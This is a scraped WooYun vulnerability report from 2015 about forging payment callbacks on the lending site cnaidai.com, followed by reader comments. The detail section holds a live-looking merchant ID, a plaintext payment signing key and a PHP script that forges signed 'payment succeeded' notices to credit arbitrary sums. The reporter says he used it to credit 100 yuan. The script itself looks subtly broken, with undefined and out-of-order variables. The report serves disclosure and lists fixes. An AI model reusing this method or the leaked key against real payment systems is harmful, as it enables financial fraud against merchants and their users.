{"id": 40762, "wybug_id": "wooyun-2015-0104034", "wybug_title": "爱贷网高隐匿任意金额充值实战￥0成本从充值到提现全过程回放", "wybug_corp": "cnaidai.com", "wybug_author": "秋风", "wybug_date": "2015-03-30 13:33", "wybug_open_date": "2015-05-14 17:54", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： 一步两步一步两步一步一步似爪牙似魔鬼的步伐摩擦 摩擦在这光滑的地上摩擦摩擦似魔鬼的步伐似魔鬼的步伐 详细说明：  一直想指出这个问题，终于找到实战案例了，该方案理论上适合目前所有的第三方支付接口！理论上利用该方法刷适当的资金，被发现可能性非常非常小。接触过一些P2P公司，发现大多数厂商都不会拿自家的订单号跟第三方的订单进行一一校对，所以标题使用了“高隐匿”做修饰。测试订单号：B8574120150326181817来看看宝付的《网银支付(借贷分离版)v3.1》交易签名具体算法 Md5Sign = MerchantID + TransID + Result + resultDesc + factMoney  + additionalInfo + SuccTime + md5key;其中除了md5key参数没有具体来源，其他参数均可通过充值时抓包获得，很不幸，无意间这个私密key被俺发现了= = 、、、\n客户端抓包记录：URL:http://paygate.baofoo.com/PayReceive/bankpay.aspxPOST:MerchantID:116745PayID:1000TradeDate:20150326181817TransID:B8574120150326181817OrderMoney:10000.0ProductName:Amount:1ProductLogo:Username:Email:Mobile:AdditionalInfo:Merchant_url:http://www.cnaidai.com/public/baofoopay.htmlReturn_url:http://www.cnaidai.com/public/baofoopay.htmlMd5Sign:F58C39C60D5A498586A17439ABB353EDNoticeType:1\n\n模拟第三方支付向服务器发包：<?php// 必要修改的参数，其中密钥最重要，其他参数可通过抓充值表单数据包正常获取$md5_key = \"xvaf66u95el7d43e\"; // md5密钥（KEY）$member_id = \"116745\"; //商户号$trans_id = \"B8574120150326181817\"; // 订单编号$ReturnUrl = \"http://www.cnaidai.com/public/baofoopay.html\";$amount = 100;// TODO:以下代码不必修改$result = \"1\";$result_desc = \"01\";$amount = intval($amount) * 100; // 充值金额$md5_sign =  md5($member_id . $trans_id . $result . $result_desc . $amount . $additional_info . $succ_time . $md5_key);$additional_info = \"\";$succ_time = \"\";$data = \"MerchantID={$member_id}&TransID={$orderid}&Result={$result}&resultDesc={$result_desc}&factMoney={$amount}&additionalInfo={$additional_info}&SuccTime={$succ_time}&Md5Sign={$md5_sign}\";post($ReturnUrl, $data);function post($url, $data) {\t$ch = curl_init();\tcurl_setopt($ch, CURLOPT_URL, $url);\tcurl_setopt($ch, CURLOPT_HEADER, 0);\tcurl_setopt($ch, CURLOPT_POST, 1);\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $data);\tcurl_exec($ch);\tcurl_close($ch);}\n文中提到的第三方支付参考文档：http://z.download.csdn.net/detail/bigamer/7081105提现我就不测了，我就刷了100块钱到账户，订单编号是B8574120150326181817，你们把相应的金额扣除掉吧！   漏洞证明：  \n\n\n\n最后说以下私密泄漏来源，最近翻了一下总表记录大于1G的弱密码库，顺便就把你们家翻出来了，这台服务器是你们家的开发环境还是？详看截图！\n\n\n\n   修复方案：  1.3306端口不对外开放2.记录第三方回调时的ip3.修改所有第三方支付的相关私密key   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-30 17:52 厂商回复： 感谢您的反馈！技术已经处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-27 07:52 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  厉害啊    \n     2015-03-27 09:33 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  这种很爽……高富帅！    \n     2015-03-27 11:27 |    \t\t巫妖 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 腚大屁股圆，家里一定很有钱)\t\t \n  我想知道细节。55555    \n     2015-03-27 14:25 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  似魔鬼的步伐，摩擦摩擦    \n     2015-03-27 14:38 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  这一下奔小康啊    \n     2015-03-30 13:49 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  黑阔来洗白了 110看这里    \n     2015-03-30 14:06 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @秋风 厂商来了 欢迎    \n     2015-03-30 14:21 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  一看就知道你是黑阔    \n     2015-03-30 14:51 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  发家致富不是梦！    \n     2015-03-30 19:14 |    \t\t小色 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 撸的一手好管)\t\t \n  汝甚屌，令尊知否.    \n     2015-03-30 19:15 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  快公开    \n     2015-04-29 22:55 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  帅气    \n     2015-05-14 18:12 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  我对楼主的裤子感兴趣 哈哈    \n     2015-05-14 19:55 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  同看裤子    \n     2015-05-15 09:21 |    \t\t圣路西法 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 围观大神ส็็็็็็ ̷̸̨̀͒̏̃ͦ...)\t\t \n  mark    \n     2015-05-15 09:31 |    \t\t凌晨的星星 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 入侵是偶然的，但安全一定不是必然的!)\t\t \n  好诗！    \n     2015-05-15 10:55 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  支付宝里的钱和服务器上的钱一对比就知道被人刷了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}